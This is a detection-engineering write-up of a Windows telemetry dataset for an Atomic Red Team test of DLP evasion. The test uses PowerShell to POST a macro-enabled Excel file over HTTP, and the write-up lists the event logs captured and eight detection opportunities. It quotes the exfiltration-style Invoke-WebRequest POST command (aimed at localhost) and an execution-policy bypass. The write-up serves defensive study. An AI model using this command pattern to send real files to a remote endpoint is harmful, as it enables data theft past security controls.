# T1027-6: Obfuscated Files or Information — DLP Evasion via Sensitive Data in VBA Macro over HTTP

## Technique Context

T1027 (Obfuscated Files or Information) encompasses various methods adversaries use to hide malicious content from detection systems. The specific sub-technique tested here involves embedding sensitive data within VBA macros and transmitting it via HTTP requests to evade data loss prevention (DLP) controls. This technique exploits the legitimate use of Office documents and HTTP communications to blend malicious data exfiltration with normal business operations.

Attackers commonly use this approach to bypass perimeter security controls that may not deeply inspect macro-enabled Office documents or may whitelist certain HTTP traffic patterns. The detection community typically focuses on unusual network destinations, suspicious PowerShell network activity, and the presence of macro-enabled documents in unexpected contexts.

## What This Dataset Contains

This dataset captures a simulated DLP evasion attempt where PowerShell attempts to transmit a macro-enabled Excel file via HTTP POST. The core activity is visible in Security event 4688: `"powershell.exe" & {Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \"C:\AtomicRedTeam\atomics\T1027\src\T1027-cc-macro.xlsm\"}`.

Key telemetry includes:
- **PowerShell Script Block Logging**: Event 4104 captures the execution of `Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body "C:\AtomicRedTeam\atomics\T1027\src\T1027-cc-macro.xlsm"`
- **Network Request Failure**: PowerShell event 4100 shows the HTTP request failed with "Unable to connect to the remote server"
- **Process Creation Chain**: Security events 4688 show powershell.exe spawning child processes including whoami.exe and another powershell.exe instance
- **Sysmon Process Creation**: Events capture whoami.exe (EID 1) and the PowerShell child process (EID 1) with full command lines
- **Image Loads**: Multiple Sysmon EID 7 events show .NET runtime components and Windows Defender modules loading into PowerShell processes
- **Process Access**: Sysmon EID 10 shows PowerShell accessing child processes with full access rights (0x1FFFFF)

The dataset shows the technique attempt but not successful network communication since the target localhost endpoint was unavailable.

## What This Dataset Does Not Contain

This dataset lacks several elements that would be present in a real-world scenario:
- **Successful HTTP transmission** - The request failed due to no listening service on 127.0.0.1
- **Network traffic capture** - No actual HTTP POST request completed, so there are no network connection events (Sysmon EID 3)
- **File content analysis** - The macro-enabled Excel file is referenced but not analyzed or opened
- **DNS resolution activity** - Since 127.0.0.1 was used, no DNS queries occurred
- **Outbound network connections** - The failed connection means no external network indicators

The sysmon-modular configuration's include-mode filtering explains why some PowerShell child processes don't have corresponding Sysmon ProcessCreate events - only processes matching suspicious patterns are captured.

## Assessment

This dataset provides good coverage for detecting PowerShell-based data exfiltration attempts despite the failed network connection. The combination of PowerShell script block logging, process auditing, and Sysmon telemetry creates multiple detection opportunities. The presence of a macro-enabled Office file in the command line, combined with HTTP POST activity, represents a strong behavioral indicator.

However, the dataset would be more valuable with successful network communication to demonstrate the complete attack chain. The localhost target limits the real-world applicability since production environments would show different network patterns and destinations.

## Detection Opportunities Present in This Data

1. **PowerShell HTTP POST with file paths** - Script block logging captures `Invoke-WebRequest` with POST method and local file path in body parameter
2. **Macro-enabled Office file in command line** - Process creation events show `.xlsm` file referenced in PowerShell execution
3. **PowerShell network request failures** - Event 4100 indicates blocked or failed outbound HTTP connections
4. **Suspicious parent-child process relationships** - PowerShell spawning additional PowerShell instances with network-related commands
5. **Process access patterns** - Sysmon EID 10 shows PowerShell accessing child processes with full privileges during network operations
6. **PowerShell execution policy bypass** - Script block logging captures `Set-ExecutionPolicy Bypass` preceding network activity
7. **Office file extensions in network commands** - Detection of Office document file paths within network-related PowerShell cmdlets
8. **Failed HTTP connections to localhost** - PowerShell errors indicating attempted but unsuccessful network communication
